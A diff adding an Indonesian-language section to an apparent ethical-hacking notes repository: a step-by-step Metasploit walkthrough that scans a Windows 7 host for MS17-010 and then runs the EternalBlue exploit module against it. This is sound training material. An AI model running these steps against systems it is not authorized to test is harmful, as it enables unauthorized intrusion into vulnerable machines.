@@ -424,6 +424,39 @@ Exploitasi pada port 1524 dengan layanan Bindshell dapat terjadi jika ada keaman
 
   - <img width="461" alt="Screenshot 2023-12-23 at 13 53 56" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/e32f7cb1-8bb6-4eb9-be2c-09bc8a6acd3e">
 
+<br>
+================================================================================================
+
+## STEP BY STEP EXPLOITATION `EternalBlue Attack` (Windows 7)
+
+EternalBlue adalah sebuah exploit (kode yang memanfaatkan kelemahan di dalam perangkat lunak) yang terkait dengan kerentanan keamanan bernama CVE-2017-0144. Kerentanan ini ada di dalam implementasi protokol Server Message Block (SMB) di sistem operasi Microsoft Windows. SMB digunakan untuk berbagi file dan printer di jaringan, dan kelemahan ini memungkinkan penyerang untuk mengeksekusi kode arbitrer di sistem target tanpa otorisasi.
+
+EternalBlue menjadi terkenal karena menjadi salah satu komponen utama dalam serangan ransomware WannaCry yang menyebar dengan cepat pada tahun 2017, mempengaruhi ribuan komputer di seluruh dunia.
+
+Berikut cara mengeksploit Windows 7 dengan `EternalBlue`:
+
+1. buka Metasploit, gunakan perintah `msfconsole`.
+2. cari exploit `EternalBlue`, gunakan perintah `search eternalblue`
+  - <img width="450" alt="Screenshot 2023-12-23 at 15 07 22" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/f875269a-c78a-46b6-a45c-33370f33250d">
+3. terlebih dahulu kita akan menggunakan `Scanner` di module metasploit untuk mengetahui apakah windows 7 vulnerable terhadap `EternalBlue Attack` atau tidak.
+4. gunakan perintah `use 3`.
+5. untuk melihat optionsnya gunakan perintah `show options`.
+6. untuk mengisi RHOSTS gunakan perintah `set RHOSTS ip_addres`.
+7. dan untuk menjalankannya gunakan perintah `run`.
+8. berikut hasil scannya:
+   - `HOST is Likely VULNERABLE to MS17-010!` itu artinya windows 7 vulnerable terhadap serangan `EternalBlue`.
+- <img width="1325" alt="Screenshot 2023-12-23 at 15 14 11" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/9dac0792-c02c-43b9-a068-5b595a77ae24">
+9. selanjutnya cari exploit `EternalBlue`, gunakan perintah `search eternalblue`.
+10. pilih `exploit/windows/smb/ms17_010_eternalblue` gunakan perintah `use 0`.
+11. untuk melihat optionsnya gunakan perintah `show options`.
+12. untuk mengisi RHOSTS gunakan perintah `set RHOSTS ip_addres`.
+13. dan untuk menjalankannya gunakan perintah `run`.
+  - <img width="450" alt="Screenshot 2023-12-23 at 15 24 01" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/5deae0fd-351f-4434-af8c-856e131acb6d">
+
+
+
+
+
 
 
 
